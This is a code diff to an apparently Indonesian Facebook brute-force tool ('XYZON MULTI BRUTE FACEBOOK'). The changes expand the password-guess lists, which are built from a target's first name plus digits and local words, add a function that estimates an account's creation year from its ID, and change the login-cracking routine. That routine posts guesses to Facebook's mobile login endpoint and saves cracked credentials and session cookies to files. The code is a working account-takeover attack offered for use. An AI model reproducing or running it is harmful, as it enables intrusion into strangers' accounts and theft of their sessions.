@@ -57,6 +57,36 @@ from rich.columns import Columns
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
 console = Console()
 sys.stdout.write('\x1b]2;XMBF | XYZON MULTI BRUTE FACEBOOK\x07')
+#---------Tahun---------#
+def tahun(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tahunz = '2009'
+		elif fx[:9] in ['100000000']       :tahunz = '2009'
+		elif fx[:8] in ['10000000']        :tahunz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
+		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
+		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
+		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
+		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
+		elif fx[:6] in ['100009']          :tahunz = '2015'
+		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
+		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
+		elif fx[:5] in ['10003']           :tahunz = '2018'
+		elif fx[:5] in ['10004']           :tahunz = '2019'
+		elif fx[:5] in ['10005']           :tahunz = '2020'
+		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
+		elif fx[:5] in ['10008','10009']:tahunz = '2023'
+		else:tahunz=''
+	elif len(fx) in [9,10]:
+		tahunz = '2008-2009'
+	elif len(fx)==8:
+		tahunz = '2007-2008'
+	elif len(fx)==7:
+		tahunz = '2006-2007'
+	else:tahunz=''
+	return tahunz
 #------------------[ USER-AGENT ]-------------------#
 uman,usman1=[],[]
 pretty.install()
@@ -1379,6 +1409,18 @@ def passwrd():
 						pass
 					else:
 						pwv.append(nmf)
+						pwv.append(frs+'@')
+						pwv.append(frs+'0')
+						pwv.append(frs+'1')
+						pwv.append(frs+'2')
+						pwv.append(frs+'3')
+						pwv.append(frs+'4')
+						pwv.append(frs+'5')
+						pwv.append(frs+'6')
+						pwv.append(frs+'7')
+						pwv.append(frs+'8')
+						pwv.append(frs+'9')
+						pwv.append(frs+'00')
 						pwv.append(frs+'01')
 						pwv.append(frs+'02')
 						pwv.append(frs+'03')
@@ -1388,27 +1430,45 @@ def passwrd():
 						pwv.append(frs+'07')
 						pwv.append(frs+'08')
 						pwv.append(frs+'09')
+						pwv.append(frs+'10')
 						pwv.append(frs+'12')
 						pwv.append(frs+'123')
-						pwv.append(frs+'321')
-						pwv.append(frs+'4321')
-						pwv.append(frs+'54321')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
 						pwv.append(frs+'1234567')
 						pwv.append(frs+'12345678')
 						pwv.append(frs+'123456789')
+						pwv.append(frs+'21')
+						pwv.append(frs+'321')
+						pwv.append(frs+'4321')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'654321')
+						pwv.append(frs+'7654321')
+						pwv.append(frs+'87654321')
+						pwv.append(frs+'987654321')
 						pwv.append(frs+'pepek')
 						pwv.append(frs+'sayang')
 						pwv.append(frs+'bangsat')
 						pwv.append(frs+'anjing')
 						pwv.append(frs+'kampang')
+						pwv.append(frs+'ngentot')
+						pwv.append(frs+'ngewe')
+						pwv.append(frs+'monyet')
+						pwv.append(frs+'telkomsel')
+						pwv.append(frs+'pepek')
+						pwv.append(frs+'lampung')
+						pwv.append(frs+'sukadana')
+						pwv.append(frs+'jokowi')
+						pwv.append(frs+'sayank')
 						pwv.append(frs+'cantik')
+						pwv.append(frs+'anjay')
 						pwv.append(frs+'memek')
 						pwv.append(frs+'sayang')
 						pwv.append(frs+'jancok')
 						pwv.append(frs+'kontol')
+						pwv.append(frs+'bintang')
+						pwv.append(frs+'termux')
 
 				else:
 
@@ -1419,6 +1479,18 @@ def passwrd():
 					else:
 
 						pwv.append(nmf)
+						pwv.append(frs+'@')
+						pwv.append(frs+'0')
+						pwv.append(frs+'1')
+						pwv.append(frs+'2')
+						pwv.append(frs+'3')
+						pwv.append(frs+'4')
+						pwv.append(frs+'5')
+						pwv.append(frs+'6')
+						pwv.append(frs+'7')
+						pwv.append(frs+'8')
+						pwv.append(frs+'9')
+						pwv.append(frs+'00')
 						pwv.append(frs+'01')
 						pwv.append(frs+'02')
 						pwv.append(frs+'03')
@@ -1428,27 +1500,45 @@ def passwrd():
 						pwv.append(frs+'07')
 						pwv.append(frs+'08')
 						pwv.append(frs+'09')
+						pwv.append(frs+'10')
 						pwv.append(frs+'12')
 						pwv.append(frs+'123')
-						pwv.append(frs+'321')
-						pwv.append(frs+'4321')
-						pwv.append(frs+'54321')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
 						pwv.append(frs+'1234567')
 						pwv.append(frs+'12345678')
 						pwv.append(frs+'123456789')
+						pwv.append(frs+'21')
+						pwv.append(frs+'321')
+						pwv.append(frs+'4321')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'654321')
+						pwv.append(frs+'7654321')
+						pwv.append(frs+'87654321')
+						pwv.append(frs+'987654321')
 						pwv.append(frs+'pepek')
 						pwv.append(frs+'sayang')
 						pwv.append(frs+'bangsat')
 						pwv.append(frs+'anjing')
 						pwv.append(frs+'kampang')
+						pwv.append(frs+'ngentot')
+						pwv.append(frs+'ngewe')
+						pwv.append(frs+'monyet')
+						pwv.append(frs+'telkomsel')
+						pwv.append(frs+'pepek')
+						pwv.append(frs+'lampung')
+						pwv.append(frs+'sukadana')
+						pwv.append(frs+'jokowi')
+						pwv.append(frs+'sayank')
 						pwv.append(frs+'cantik')
+						pwv.append(frs+'anjay')
 						pwv.append(frs+'memek')
 						pwv.append(frs+'sayang')
 						pwv.append(frs+'jancok')
 						pwv.append(frs+'kontol')
+						pwv.append(frs+'bintang')
+						pwv.append(frs+'termux')
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
@@ -1621,7 +1711,7 @@ def crackmbasic(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}")
+				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}|{tahun(fx)}").add(f"[bold yellow]{ua}")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1632,7 +1722,7 @@ def crackmbasic(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
+				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}|{tahun(fx)}").add(f"[bold green]{kuki}")
 				cetak(tree)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
